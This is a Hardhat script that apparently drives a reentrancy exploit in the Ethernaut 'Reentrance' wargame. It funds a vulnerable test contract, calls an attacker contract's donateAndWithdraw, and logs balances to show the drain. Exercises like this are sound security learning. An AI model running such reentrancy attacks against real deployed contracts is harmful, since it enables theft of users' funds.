const { deployments, ethers, getNamedAccounts } = require("hardhat")

async function main() {

  let reentrance
  let attackReentrance
  let player
  let deployer
  const value = ethers.utils.parseEther("2")


  deployer = (await getNamedAccounts()).deployer
  player = (await getNamedAccounts()).player

  await deployments.fixture(["reentrance"])
  reentrance = await ethers.getContract("Reentrance", deployer)
  attackReentrance = await ethers.getContract("AttackReentrance", player)

  // const transaction = await player.call({ to: attackReentrance.address, value: value })

  const accounts = await ethers.getSigners();
  const deployer_signer = accounts[0];
    const transaction = deployer_signer.sendTransaction({
      from:deployer,
      to: reentrance.address,
      value:  ethers.utils.parseEther("4"),
    }).then((transaction) => {
  })

  let reentranceBalance = await reentrance.provider.getBalance(reentrance.address);
  console.log("ReentranceBalance: ", reentranceBalance.toString())

  let attackReentranceBalance = await attackReentrance.provider.getBalance(attackReentrance.address);
  console.log("attackReentranceBalance: ", attackReentranceBalance.toString())



  // player donates to ReentranceAttack
  // const donation = await reentrance.donate(attackReentrance.address, {value: value});
  // tx = await attackReentrance.attack(reentrance.address);

  const tx = await attackReentrance.donateAndWithdraw({value: value});


  reentranceBalance = await reentrance.provider.getBalance(reentrance.address);
  console.log("ReentranceBalance: ", reentranceBalance.toString())

  attackReentranceBalance = await attackReentrance.provider.getBalance(attackReentrance.address);
  console.log("attackReentranceBalance: ", attackReentranceBalance.toString())

}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error)
        process.exit(1)
    })
